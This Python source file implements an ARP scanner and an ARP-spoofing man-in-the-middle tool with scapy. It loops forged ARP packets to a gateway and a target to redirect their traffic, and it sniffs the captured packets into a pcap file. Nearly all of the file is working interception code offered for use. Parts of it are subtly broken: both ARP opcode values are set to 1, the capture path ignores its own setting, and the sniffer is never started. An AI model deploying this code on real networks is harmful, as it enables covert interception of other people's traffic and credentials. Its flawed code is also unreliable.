#!/usr/bin/python3
import re
import socket
from dataclasses import dataclass
from enum import IntEnum

from scapy.layers.l2 import ARP, arping
from scapy.sendrecv import send, wrpcap, AsyncSniffer
import threading
import time

from network.inet.inet_tools import get_hostname

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (4095, 4095))
except ModuleNotFoundError:
    pass  # Not supported in Windows


class ArpStatement(IntEnum):
    WHO_HAS = 1
    IS_AT = 1


@dataclass
class ArpResult:
    ip: str
    mac: str
    host: str


def spoof_packet(target_ip, target_mac, spoof_ip):
    pkt = ARP(op=ArpStatement.IS_AT, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)


def get_mac(ip, arp_response):
    return next(arp for arp in arp_response if arp.ip == ip).mac


class Arp:
    def __init__(self, wait_time=3.0, pcap_file=None):
        if wait_time <= 0:
            raise ValueError("Cannot have negative or zero wait time")

        self.wait_time = wait_time
        self.pcap_file = pcap_file
        self.lock = threading.RLock()
        self.shutdown_event = threading.Event()

        self.arp_responses = list()

    def arp_scan(self, ip_range, resolve=False):
        arp_responses = list()

        arp_response = arping(ip_range, verbose=0)[0]

        for response in arp_response:
            answer = response.answer
            host = ""
            if resolve:
                host = get_hostname(answer.psrc)

            arp_responses.append(ArpResult(ip=answer.psrc, mac=answer.hwsrc, host=host))

        return sorted(arp_responses, key=lambda item: socket.inet_aton(item.ip))

    def spoof_packets(self, gateway_ip, gateway_mac, target_ip, target_mac):
        # We need to send spoof packets to the gateway and the target device.
        while not self.check_shutdown():
            # Send an arp packet to the gateway, imitating the target IP
            spoof_packet(gateway_ip, gateway_mac, target_ip)
            # Send an arp packet to the target, imitating the gateway
            spoof_packet(target_ip, target_mac, gateway_ip)
            time.sleep(3)
        print("Spoof complete")

    def check_shutdown(self):
        with self.lock:
            return self.shutdown_event.is_set()

    def shutdown(self):
        with self.lock:
            self.shutdown_event.set()

    def sniff_packets(self, interface):
        async_sniff = AsyncSniffer(prn=self.process_packet, store=False, iface=interface)
        async_sniff.start()
        return async_sniff

    def process_packet(self, pkt):
        if self.pcap_file:
            wrpcap("../inet/requests.pcap", pkt, append=True)

    def start(self, gateway_ip, gateway_mac, target_ip, target_mac):
        args = {"gateway_ip": gateway_ip, "gateway_mac": gateway_mac,
                "target_ip": target_ip, "target_mac": target_mac}

        thread = threading.Thread(target=self.spoof_packets, daemon=True,
                                  kwargs=args)
        thread.start()


class PermissionException(Exception):
    """Raised when process is not running under sudo"""
    pass


